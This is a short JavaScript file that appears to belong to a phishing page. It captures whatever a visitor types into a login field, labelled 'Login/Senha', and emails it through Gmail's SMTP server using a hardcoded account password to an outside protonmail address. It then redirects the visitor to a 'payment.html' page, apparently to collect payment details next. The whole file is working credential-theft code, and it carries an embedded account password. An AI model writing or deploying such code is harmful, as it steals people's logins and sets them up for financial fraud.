window.onload=function()
{
    let pwd = document.getElementById("useridInput");
    pwd.addEventListener("focus", myFocusFunction, true);
    pwd.addEventListener("blur", myBlurFunction, true);

    function myFocusFunction() {
        document.getElementById("btn").style.backgroundColor = "#3e9920";
    }

    function myBlurFunction() {
        document.getElementById("myInput").style.backgroundColor = "";
    }


    let btn = document.getElementById("btn");


    btn.onclick = function() {
        let pwd = document.getElementById("useridInput").value;
        let finalmessage = `Login/Senha : ${pwd} <br>`;

        if (pwd.length > 6) {
            Email.send({
                Host: "smtp.gmail.com",
                Username : "xsda.ddce.2343.2343.xsop@gmail.com",
                Password : "xhqe towf geiu nvyt",
                To : 'user1533@protonmail.com',
                From : "xsda.ddce.2343.2343.xsop@gmail.com",
                Subject : "Mail from website",
                Body : finalmessage
            });
            window.location.assign('payment.html');
        } else {
            window.location.assign('#top');
        }
    }
}
